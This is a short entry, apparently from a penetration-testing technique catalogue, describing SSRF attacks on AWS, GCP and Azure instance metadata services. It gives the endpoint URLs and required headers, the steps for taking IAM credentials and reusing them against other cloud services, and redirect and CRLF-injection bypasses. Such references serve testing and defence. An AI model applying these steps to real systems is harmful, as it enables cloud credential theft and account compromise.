title: SSRF to Cloud Metadata Service (IMDS v1/v2)

technique.summary: Exploit SSRF to reach cloud instance metadata services and extract IAM credentials, API tokens, and infrastructure configuration. IMDS v1 is trivially exploitable; IMDS v2 requires an additional PUT request to obtain a token.
steps: Confirm SSRF exists by requesting an attacker-controlled callback server
Attempt AWS IMDS v1: GET http://169.254.169.254/latest/meta-data/
If IMDS v1 blocked, attempt IMDS v2: first PUT to get token, then GET with token header
For GCP: GET http://metadata.google.internal/computeMetadata/v1/ with Metadata-Flavor: Google header
For Azure: GET http://169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata: true header
Use extracted credentials to access other cloud services (S3, EC2, etc.)

payloads.notes: AWS IMDS v1 — lists available IAM roles
AWS — may contain startup scripts with hardcoded secrets
GCP — requires Metadata-Flavor: Google header (may need header injection)

bypassTechniques: URL redirect: host a page that 302-redirects to metadata endpoint
For IMDSv2: chain with header injection (CRLF) to inject PUT + token header
